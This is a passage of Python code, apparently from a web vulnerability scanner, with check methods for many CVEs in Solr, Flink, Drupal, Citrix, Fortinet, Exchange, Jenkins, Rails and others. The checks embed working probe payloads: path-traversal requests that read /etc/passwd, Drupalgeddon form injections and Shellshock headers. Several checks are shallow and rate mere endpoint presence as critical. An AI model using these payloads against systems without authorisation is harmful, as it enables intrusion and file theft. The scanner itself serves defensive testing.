                        'type': 'CVE-2019-0193 - Apache Solr DataImportHandler RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Solr DataImportHandler endpoint accessible',
                        'cve_references': ['CVE-2019-0193'],
                        'description': 'Apache Solr DataImportHandler RCE via crafted '
                                       'data config with script transformation',
                        'remediation': 'Upgrade Solr to 8.1.1+, or disable DataImportHandler',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-0193 error: {e}")
        return vulnerabilities

    def _check_cve_2019_12409(self, base_url: str) -> List[Dict]:
        """CVE-2019-12409: Apache Solr RCE via config API."""
        vulnerabilities = []
        path = "/solr/node/admin/config"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 401):
                if 'solr' in resp.text.lower() or 'config' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2019-12409 - Apache Solr Config RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Solr config API endpoint accessible',
                        'cve_references': ['CVE-2019-12409'],
                        'description': 'Apache Solr RCE via malicious config with '
                                       'ENABLE_REMOTE_JMX_OPTS',
                        'remediation': 'Upgrade Solr to 8.2.0+ or secure JMX',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-12409 error: {e}")
        return vulnerabilities

    def _check_cve_2020_17518(self, base_url: str) -> List[Dict]:
        """CVE-2020-17518: Apache Flink directory traversal RCE."""
        vulnerabilities = []
        path = "/jobmanager/logs/..%252f..%252f..%252f..%252fetc%252fpasswd"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'root:x:0:0' in resp.text or 'nobody:x:' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-17518 - Apache Flink Path Traversal RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': '/etc/passwd content retrieved via path traversal',
                        'cve_references': ['CVE-2020-17518'],
                        'description': 'Apache Flink directory traversal via jobmanager/logs endpoint',
                        'remediation': 'Upgrade Flink to 1.11.3+ or 1.12.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-17518 error: {e}")

        # Also check if Flink dashboard is present
        path2 = "/#/overview"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code == 200 and 'flink' in resp.text.lower():
                vulnerabilities.append({
                    'type': 'CVE-2020-17518 - Apache Flink Dashboard',
                    'severity': 'high',
                    'url': url2,
                    'evidence': 'Apache Flink dashboard accessible',
                    'cve_references': ['CVE-2020-17518'],
                    'description': 'Apache Flink dashboard is accessible - may be vulnerable '
                                   'to path traversal RCE',
                    'remediation': 'Upgrade Flink to patched version and restrict access',
                })
        except Exception:
            pass
        return vulnerabilities

    def _check_cve_2020_17519(self, base_url: str) -> List[Dict]:
        """CVE-2020-17519: Apache Flink directory traversal (different endpoint)."""
        vulnerabilities = []
        path = "/jobmanager/logs/..%252f..%252f..%252f..%252fbin%252fid"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'uid=' in resp.text or 'root' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-17519 - Apache Flink Directory Traversal',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Arbitrary file read confirmed via path traversal',
                        'cve_references': ['CVE-2020-17519'],
                        'description': 'Apache Flink directory traversal via jobmanager/logs '
                                       '(different path from CVE-2020-17518)',
                        'remediation': 'Upgrade Flink to 1.11.3+ or 1.12.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-17519 error: {e}")
        return vulnerabilities

    # =========================================================================
    # PHP / Web Application CVEs
    # =========================================================================

    def _check_cve_2017_9841(self, base_url: str) -> List[Dict]:
        """CVE-2017-9841: PHPUnit RCE."""
        vulnerabilities = []
        paths = [
            '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            '/phpunit/src/Util/PHP/eval-stdin.php',
            '/lib/phpunit/src/Util/PHP/eval-stdin.php',
            '/thirdparty/phpunit/src/Util/PHP/eval-stdin.php',
        ]
        for p in paths:
            try:
                test_url = urljoin(base_url, p)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    body = resp.text.strip()
                    if not body or body == '':
                        vulnerabilities.append({
                            'type': 'CVE-2017-9841 - PHPUnit RCE',
                            'severity': 'critical',
                            'url': test_url,
                            'evidence': 'PHPUnit eval-stdin.php accessible and ready to accept code execution',
                            'cve_references': ['CVE-2017-9841'],
                            'description': 'PHPUnit eval-stdin.php allows remote code execution '
                                           'via POST body sent as PHP code',
                            'remediation': 'Remove PHPUnit from production, or restrict access '
                                           'to vendor/ directory',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2017-9841 error: {e}")
        return vulnerabilities

    def _check_cve_2018_7600(self, url: str) -> List[Dict]:
        """CVE-2018-7600: Drupalgeddon2 RCE."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
            test_url = urljoin(base, path)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
            }
            data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=test123"
            resp = self.http_client.post(test_url, data=data, headers=headers, timeout=self.timeout)
            if resp and 'test123' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2018-7600 - Drupalgeddon2 RCE',
                    'severity': 'critical',
                    'url': url,
                    'evidence': 'Drupal RCE via #post_render array injection',
                    'cve_references': ['CVE-2018-7600'],
                    'description': 'Drupal core RCE via crafted form API request (Drupalgeddon2)',
                    'remediation': 'Upgrade Drupal to 7.58+, 8.3.9+, 8.4.6+, 8.5.1+',
                })
        except Exception as e:
            logger.debug(f"CVE-2018-7600 error: {e}")
        return vulnerabilities

    def _check_cve_2018_7602(self, url: str) -> List[Dict]:
        """CVE-2018-7602: Drupalgeddon3 RCE."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/user/login"
            test_url = urljoin(base, path)
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = "form_id=user_login_form&_drupal_ajax=1&user_id=1&form_build_id=&user_pass[#type]=markup&user_pass[#markup]=test456&user_pass[#post_render][]=printf"
            resp = self.http_client.post(test_url, data=data, headers=headers, timeout=self.timeout)
            if resp and 'test456' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2018-7602 - Drupalgeddon3 RCE',
                    'severity': 'critical',
                    'url': url,
                    'evidence': 'Drupal RCE via user_pass #post_render injection',
                    'cve_references': ['CVE-2018-7602'],
                    'description': 'Drupal core RCE via crafted login form request (Drupalgeddon3)',
                    'remediation': 'Upgrade Drupal to same versions as CVE-2018-7600',
                })
        except Exception as e:
            logger.debug(f"CVE-2018-7602 error: {e}")
        return vulnerabilities

    def _check_cve_2019_16759(self, base_url: str) -> List[Dict]:
        """CVE-2019-16759: vBulletin RCE."""
        vulnerabilities = []
        path = "/vb5/ajax/api/widget/render_widget?widgetConfig[code]=html&widgetConfig[config][template]=test"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'widgetConfig' in resp.text or 'template' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2019-16759 - vBulletin RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'vBulletin widget rendering API accessible',
                        'cve_references': ['CVE-2019-16759'],
                        'description': 'vBulletin RCE via widgetConfig template injection',
                        'remediation': 'Upgrade vBulletin to 5.5.4+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-16759 error: {e}")
        return vulnerabilities

    def _check_cve_2018_15961(self, base_url: str) -> List[Dict]:
        """CVE-2018-15961: Adobe ColdFusion directory traversal."""
        vulnerabilities = []
        paths = [
            '/CFIDE/administrator/',
            '/CFIDE/administrator/index.cfm',
            '/cfide/administrator/',
        ]
        for p in paths:
            try:
                test_url = urljoin(base_url, p)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    if 'coldfusion' in resp.text.lower() or 'cfadmin' in resp.text.lower():
                        vulnerabilities.append({
                            'type': 'CVE-2018-15961 - Adobe ColdFusion Directory Traversal',
                            'severity': 'critical',
                            'url': test_url,
                            'evidence': 'ColdFusion administrator interface accessible',
                            'cve_references': ['CVE-2018-15961'],
                            'description': 'Adobe ColdFusion directory traversal allowing '
                                           'unauthorized access to admin panel',
                            'remediation': 'Upgrade ColdFusion to 2018.0.1+, 2016.0.7+, 11.0.15+',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2018-15961 error: {e}")
        return vulnerabilities

    # =========================================================================
    # VPN / Appliance CVEs
    # =========================================================================

    def _check_cve_2019_11510(self, base_url: str) -> List[Dict]:
        """CVE-2019-11510: Pulse Secure VPN arbitrary file reading."""
        vulnerabilities = []
        path = "/dana-na/../dana/html5acc/guacamole/../../../../etc/passwd?/dana/html5acc/guacamole/"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'root:x:0:0' in resp.text or 'nobody:x:' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2019-11510 - Pulse Secure File Read',
                        'severity': 'critical',
                        'url': url,
                        'evidence': '/etc/passwd content retrieved via path traversal',
                        'cve_references': ['CVE-2019-11510'],
                        'description': 'Pulse Connect Secure arbitrary file reading via '
                                       'path traversal in /dana-na/ endpoint',
                        'remediation': 'Upgrade Pulse Connect Secure to 9.0R3+ or 8.1R15+ or 8.2R12+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-11510 error: {e}")

        # Also detect Pulse Secure login page
        path2 = "/dana-na/auth/url_admin/welcome.cgi"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code == 200 and 'pulse' in resp.text.lower():
                vulnerabilities.append({
                    'type': 'CVE-2019-11510 - Pulse Secure Detected',
                    'severity': 'high',
                    'url': url2,
                    'evidence': 'Pulse Secure VPN login page detected',
                    'cve_references': ['CVE-2019-11510'],
                    'description': 'Pulse Connect Secure VPN detected - verify patching '
                                   'for file read vulnerability',
                    'remediation': 'Upgrade Pulse Connect Secure to latest patched version',
                })
        except Exception:
            pass
        return vulnerabilities

    def _check_cve_2019_19781(self, base_url: str) -> List[Dict]:
        """CVE-2019-19781: Citrix ADC directory traversal."""
        vulnerabilities = []
        path = "/vpn/../vpns/cfg/smb.conf"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'global' in resp.text or 'workgroup' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2019-19781 - Citrix ADC Directory Traversal',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Citrix ADC configuration file accessible via path traversal',
                        'cve_references': ['CVE-2019-19781'],
                        'description': 'Citrix Application Delivery Controller (ADC) directory '
                                       'traversal allowing arbitrary file read',
                        'remediation': 'Upgrade Citrix ADC to 12.1-55.18+, 12.1-56.17+, '
                                       '13.0-58.14+, 13.0-47.22+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-19781 error: {e}")
        return vulnerabilities

    def _check_cve_2020_8191(self, base_url: str) -> List[Dict]:
        """CVE-2020-8191: Citrix ADC LFI."""
        vulnerabilities = []
        path = "/menu/guest?"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'citrix' in resp.text.lower() or 'nsc_cc' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-8191 - Citrix ADC LFI',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Citrix ADC menu/guest endpoint accessible',
                        'cve_references': ['CVE-2020-8191'],
                        'description': 'Citrix ADC LFI via /menu/guest endpoint',
                        'remediation': 'Upgrade Citrix ADC to 12.1-55.18+, 13.0-47.22+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-8191 error: {e}")
        return vulnerabilities

    def _check_cve_2020_3452(self, base_url: str) -> List[Dict]:
        """CVE-2020-3452: Cisco ASA directory traversal."""
        vulnerabilities = []
        path = "/+CSCOT+/translation-table?type=app&default-language&login&cmd=ls"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'CSCOT' in resp.text or 'translation' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-3452 - Cisco ASA Directory Traversal',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Cisco ASA CSCOT translation table accessible',
                        'cve_references': ['CVE-2020-3452'],
                        'description': 'Cisco ASA/FTD directory traversal via CSCOT translation-table',
                        'remediation': 'Upgrade Cisco ASA to 9.6.4.42+, 9.8.4.25+, 9.9.2.78+, '
                                       '9.10.1.44+, 9.12.4.4+, 9.13.1.19+, 9.14.1.10+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-3452 error: {e}")
        return vulnerabilities

    def _check_cve_2018_0296(self, base_url: str) -> List[Dict]:
        """CVE-2018-0296: Cisco ASA path traversal."""
        vulnerabilities = []
        path = "/cgi-bin/cgi_wrapper/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/sh?"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 400, 500):
                if 'cgi_wrapper' in resp.text.lower() or 'cisco' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2018-0296 - Cisco ASA Path Traversal',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Cisco ASA cgi_wrapper endpoint accessible',
                        'cve_references': ['CVE-2018-0296'],
                        'description': 'Cisco ASA directory traversal via cgi_wrapper',
                        'remediation': 'Upgrade Cisco ASA to 9.4.4.23+, 9.6.3.19+, 9.8.2.29+, '
                                       '9.9.2.14+, 9.10.1.8+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-0296 error: {e}")
        return vulnerabilities

    def _check_cve_2018_13379(self, base_url: str) -> List[Dict]:
        """CVE-2018-13379: Fortinet FortiOS path traversal."""
        vulnerabilities = []
        path = "/remote/fgt_lang?lang=/../../../..//etc/passwd"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'root:x:0:0' in resp.text or 'nobody:x:' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2018-13379 - Fortinet FortiOS Path Traversal',
                        'severity': 'critical',
                        'url': url,
                        'evidence': '/etc/passwd content retrieved via path traversal in fgt_lang',
                        'cve_references': ['CVE-2018-13379'],
                        'description': 'Fortinet FortiOS SSL VPN path traversal allowing '
                                       'arbitrary file reading',
                        'remediation': 'Upgrade FortiOS to 5.4.13+, 5.6.9+, 6.0.4+, 6.2.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-13379 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Microsoft Exchange CVEs
    # =========================================================================

    def _check_cve_2021_26855(self, base_url: str) -> List[Dict]:
        """CVE-2021-26855: Exchange ProxyLogon SSRF."""
        vulnerabilities = []
        path = "/ecp/"
        url = urljoin(base_url, path)
        try:
            headers = {
                'Cookie': 'X-BEResource=localhost~1942062522;',
                'X-Forwarded-For': '127.0.0.1',
                'X-Forwarded-Host': 'localhost',
            }
            resp = self.http_client.get(url, headers=headers, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                if 'outlook' in resp.text.lower() or 'exchange' in resp.text.lower() or 'ecp' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2021-26855 - Exchange ProxyLogon SSRF',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Exchange Control Panel (ECP) accessible - ProxyLogon SSRF vector',
                        'cve_references': ['CVE-2021-26855'],
                        'description': 'Microsoft Exchange Server SSRF allowing '
                                       'pre-authentication arbitrary HTTP requests (ProxyLogon)',
                        'remediation': 'Apply March 2021 Exchange security updates',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-26855 error: {e}")
        return vulnerabilities

    def _check_cve_2021_34473(self, base_url: str) -> List[Dict]:
        """CVE-2021-34473: Exchange ProxyLogon path traversal."""
        vulnerabilities = []
        path = "/ecp/Current/exporttool/mrviewer.ashx"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code != 404:
                if 'mrviewer' in resp.text.lower() or 'exchange' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2021-34473 - Exchange Path Traversal',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Exchange ECP path traversal endpoint accessible',
                        'cve_references': ['CVE-2021-34473'],
                        'description': 'Microsoft Exchange Server path traversal allowing '
                                       'pre-authentication SSRF (ProxyLogon)',
                        'remediation': 'Apply March 2021 Exchange security updates',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-34473 error: {e}")
        return vulnerabilities

    def _check_cve_2020_0688(self, base_url: str) -> List[Dict]:
        """CVE-2020-0688: Microsoft Exchange RCE."""
        vulnerabilities = []
        path = "/ecp/"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                body_lower = resp.text.lower()
                if 'exchange' in body_lower or 'outlook' in body_lower:
                    vulnerabilities.append({
                        'type': 'CVE-2020-0688 - Microsoft Exchange RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Exchange Control Panel detected - may be vulnerable '
                                    'to CVE-2020-0688 if unpatched',
                        'cve_references': ['CVE-2020-0688'],
                        'description': 'Microsoft Exchange Server RCE via crafted payload '
                                       'in Exchange Control Panel (ECP)',
                        'remediation': 'Apply February 2020 Exchange security updates',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-0688 error: {e}")
        return vulnerabilities

    def _check_cve_2021_31207(self, base_url: str) -> List[Dict]:
        """CVE-2021-31207: Microsoft Exchange ProxyShell RCE."""
        vulnerabilities = []
        path = "/ecp/Current/exporttool/mrviewer.ashx?uid="
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 500):
                if 'exchange' in resp.text.lower() or 'exporttool' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2021-31207 - Exchange ProxyShell RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Exchange exporttool endpoint accessible - ProxyShell vector',
                        'cve_references': ['CVE-2021-31207'],
                        'description': 'Microsoft Exchange Server RCE via crafted '
                                       'exporttool request (ProxyShell)',
                        'remediation': 'Apply April 2021 Exchange security updates',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-31207 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Java Application Server CVEs
    # =========================================================================

    def _check_cve_2017_7504(self, base_url: str) -> List[Dict]:
        """CVE-2017-7504: JBoss RCE."""
        vulnerabilities = []
        path = "/jbossmq-httpil/HTTPServerILServlet"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code != 404:
                if 'jboss' in resp.text.lower() or 'jbossmq' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2017-7504 - JBoss RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'JBoss JMS HTTP IL endpoint accessible',
                        'cve_references': ['CVE-2017-7504'],
                        'description': 'JBoss RCE via HTTPServerILServlet deserialization',
                        'remediation': 'Upgrade JBoss AS / WildFly to patched version',
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-7504 error: {e}")
        return vulnerabilities

    def _check_cve_2017_12149(self, base_url: str) -> List[Dict]:
        """CVE-2017-12149: JBoss RCE via HTTP invoker."""
        vulnerabilities = []
        path = "/invoker/JMXInvokerServlet"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code != 404:
                if 'jmx' in resp.text.lower() or 'invoker' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2017-12149 - JBoss JMX Invoker RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'JBoss JMXInvokerServlet accessible',
                        'cve_references': ['CVE-2017-12149'],
                        'description': 'JBoss RCE via JMXInvokerServlet deserialization',
                        'remediation': 'Upgrade JBoss AS / WildFly to patched version',
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-12149 error: {e}")
        return vulnerabilities

    def _check_cve_2018_1000861(self, base_url: str) -> List[Dict]:
        """CVE-2018-1000861: Jenkins RCE."""
        vulnerabilities = []
        path = "/cli/"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 400):
                if 'jenkins' in resp.text.lower() or 'cli' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2018-1000861 - Jenkins CLI RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Jenkins CLI endpoint accessible',
                        'cve_references': ['CVE-2018-1000861'],
                        'description': 'Jenkins RCE via crafted CLI request',
                        'remediation': 'Upgrade Jenkins to 2.153+ or LTS 2.138.3+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-1000861 error: {e}")

        # Also detect Jenkins server
        path2 = "/login?from=%2F"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'jenkins' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2018-1000861 - Jenkins Detected',
                        'severity': 'high',
                        'url': url2,
                        'evidence': 'Jenkins login page detected',
                        'cve_references': ['CVE-2018-1000861'],
                        'description': 'Jenkins CI server detected - check for various CVEs',
                        'remediation': 'Keep Jenkins up to date with security patches',
                    })
        except Exception:
            pass
        return vulnerabilities

    def _check_cve_2017_1000353(self, base_url: str) -> List[Dict]:
        """CVE-2017-1000353: Jenkins RCE via CLI."""
        vulnerabilities = []
        path = "/jnlpJars/jenkins-cli.jar"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if resp.text.startswith('PK\x03\x04') or 'PK' in resp.text[:4]:
                    vulnerabilities.append({
                        'type': 'CVE-2017-1000353 - Jenkins CLI JAR RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Jenkins CLI JAR accessible (JNLP-based RCE vector)',
                        'cve_references': ['CVE-2017-1000353'],
                        'description': 'Jenkins CLI JAR file accessible - enables '
                                       'JNLP-based RCE',
                        'remediation': 'Upgrade Jenkins to 2.56+ or LTS 2.46.2+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-1000353 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Shell / Rails / Other CVEs
    # =========================================================================

    def _check_cve_2014_6271(self, base_url: str) -> List[Dict]:
        """CVE-2014-6271: ShellShock (Bash CGI)."""
        vulnerabilities = []
        cgi_paths = [
            '/cgi-bin/test.cgi', '/cgi-bin/test.sh', '/cgi-bin/status',
            '/cgi-bin/vulnerable', '/cgi-bin/shellshock-test.cgi',
        ]
        for cgi_path in cgi_paths:
            try:
                test_url = urljoin(base_url, cgi_path)
                headers = {
                    'User-Agent': '() { :; }; echo; echo ShellShock_Test_String',
                    'Cookie': '() { :; }; echo; echo ShellShock_Test_String',
                }
                resp = self.http_client.get(test_url, headers=headers, timeout=self.timeout)
                if resp and 'ShellShock_Test_String' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2014-6271 - ShellShock (Bash CGI)',
                        'severity': 'critical',
                        'url': test_url,
                        'parameter': 'User-Agent/Cookie',
                        'evidence': 'ShellShock test string reflected in CGI response',
                        'cve_references': ['CVE-2014-6271'],
                        'description': 'GNU Bash environment variable injection (ShellShock) '
                                       'via CGI scripts',
                        'remediation': 'Upgrade bash and patch CGI scripts',
                    })
                    break
            except Exception as e:
                logger.debug(f"CVE-2014-6271 error: {e}")
        return vulnerabilities

    def _check_cve_2019_5418(self, url: str) -> List[Dict]:
        """CVE-2019-5418: Ruby on Rails file disclosure."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/robots"
            test_url = urljoin(base, path)
            headers = {'Accept': '../../../../../../../../etc/passwd{{'}
            resp = self.http_client.get(test_url, headers=headers, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'root:x:0:0' in resp.text or 'nobody:x:' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2019-5418 - Rails File Disclosure',
                        'severity': 'critical',
                        'url': test_url,
                        'parameter': 'Accept header',
                        'evidence': '/etc/passwd content retrieved via Accept header path traversal',
                        'cve_references': ['CVE-2019-5418'],
                        'description': 'Ruby on Rails file disclosure via Accept header '
                                       'path traversal in template rendering',
                        'remediation': 'Upgrade Rails to 5.2.2.1+, 6.0.0b3+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-5418 error: {e}")
        return vulnerabilities

    def _check_cve_2018_3760(self, url: str) -> List[Dict]:
        """CVE-2018-3760: Ruby on Rails path traversal."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/assets/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
            test_url = urljoin(base, path)
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'root:x:0:0' in resp.text or 'nobody:x:' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2018-3760 - Rails Path Traversal',
                        'severity': 'high',
                        'url': test_url,
                        'parameter': 'URL path',
                        'evidence': '/etc/passwd content retrieved via double-encoded path traversal',
                        'cve_references': ['CVE-2018-3760'],
                        'description': 'Ruby on Rails Sprockets path traversal allowing '
                                       'arbitrary file read',
                        'remediation': 'Upgrade Sprockets to 3.7.2+ or 4.0.0.beta8+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-3760 error: {e}")
        return vulnerabilities

    def _check_cve_2018_19965(self, base_url: str) -> List[Dict]:
        """CVE-2018-19965: Cockpit CMS RCE."""
        vulnerabilities = []
        paths = ['/cockpit/', '/cockpit/login', '/cockpit/auth']
        for p in paths:
            try:
                test_url = urljoin(base_url, p)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    if 'cockpit' in resp.text.lower() or 'COCKPIT_SESSION' in resp.text:
                        vulnerabilities.append({
                            'type': 'CVE-2018-19965 - Cockpit CMS RCE',
                            'severity': 'critical',
                            'url': test_url,
                            'evidence': 'Cockpit CMS interface detected',
                            'cve_references': ['CVE-2018-19965'],
                            'description': 'Cockpit CMS RCE via crafted CSV upload',
                            'remediation': 'Upgrade Cockpit CMS to latest version',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2018-19965 error: {e}")
        return vulnerabilities

    def _check_cve_2021_21234(self, base_url: str) -> List[Dict]:
        """CVE-2021-21234: Spring Boot Actuator log file disclosure."""
        vulnerabilities = []
        path = "/actuator/logfile"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200 and len(resp.text) > 50:
                vulnerabilities.append({
                    'type': 'CVE-2021-21234 - Spring Boot Actuator Log Disclosure',
                    'severity': 'high',
                    'url': url,
                    'evidence': 'Spring Boot Actuator logfile endpoint exposes application logs',
                    'cve_references': ['CVE-2021-21234'],
                    'description': 'Spring Boot Actuator logfile endpoint exposed - '
                                   'may leak sensitive information including credentials',
                    'remediation': 'Disable Spring Boot Actuator logfile endpoint in production',
                })
        except Exception as e:
            logger.debug(f"CVE-2021-21234 error: {e}")

        # Also check for other actuator endpoints
        actuator_paths = [
            '/actuator', '/actuator/health', '/actuator/env',
            '/actuator/beans', '/actuator/conditions', '/actuator/mappings',
        ]
        for ap in actuator_paths:
            try:
                test_url = urljoin(base_url, ap)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    if '_links' in resp.text or 'self' in resp.text or 'status' in resp.text:
                        vulnerabilities.append({
                            'type': 'Spring Boot Actuator Exposure',
                            'severity': 'medium',
                            'url': test_url,
                            'evidence': f'Spring Boot Actuator {ap} endpoint exposed',
                            'description': 'Spring Boot Actuator endpoints exposed without authentication',
                            'remediation': 'Secure or disable Actuator endpoints in production',
                        })
                        break
            except Exception:
                pass
        return vulnerabilities

    def _check_cve_2019_11043(self, base_url: str) -> List[Dict]:
        """CVE-2019-11043: PHP-FPM RCE (under nginx)."""
        vulnerabilities = []
        path = "/index.php?a[]=1"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (500, 502):
                if 'php' in resp.text.lower() or 'fpm' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2019-11043 - PHP-FPM RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'PHP-FPM returns error on array parameter - '
                                    'may be vulnerable to path_info RCE',
                        'cve_references': ['CVE-2019-11043'],
                        'description': 'PHP-FPM RCE via fastcgi_split_path_info in nginx config',
                        'remediation': 'Upgrade PHP to 7.1.33+, 7.2.24+, 7.3.11+, '
                                       'or remove redundant fastcgi_split_path_info',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-11043 error: {e}")
        return vulnerabilities

    # =========================================================================
    # WordPress CVEs & Common Issues
    # =========================================================================

